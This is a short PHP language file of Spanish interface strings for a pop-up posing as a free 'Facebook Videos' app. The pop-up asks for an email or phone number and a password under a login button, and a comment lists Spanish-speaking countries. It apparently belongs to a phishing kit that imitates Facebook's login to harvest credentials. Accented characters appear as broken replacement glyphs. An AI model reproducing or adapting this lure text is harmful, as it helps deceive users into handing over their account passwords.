<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'es';
 
// Fondo

$lang['TITULO_PAGINA'] = "Aplicacion Facebook";
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Videos Aplicaci�n (Gratis)';
$lang['POPUP_DESCRIPCION'] = '�OLVIDASTE LA CONTRASE�A?';
$lang['POPUP_CORREO'] = 'Correo electr�nico o tel�fono';
$lang['POPUP_CONTRASENA'] = 'Contrase�a';
$lang['POPUP_SUBMIT'] = 'INICIAR SESI�N';
$lang['POPUP_CANDADO'] = 'No se permite que esta aplicaci�n publique en Facebook.';

/*
array("Mexico", "Spain", "Colombia", "Argentina", "Peru", "Venezuela", "Chile", "Ecuador", "Guatemala", "Cuba", "Bolivia", "Dominican Republic", "Honduras", "Paraguay", "El Salvador", "Nicaragua", "Costa Rica", "Puerto Rico", "Panama", "Uruguay", "Equatorial Guinea")
*/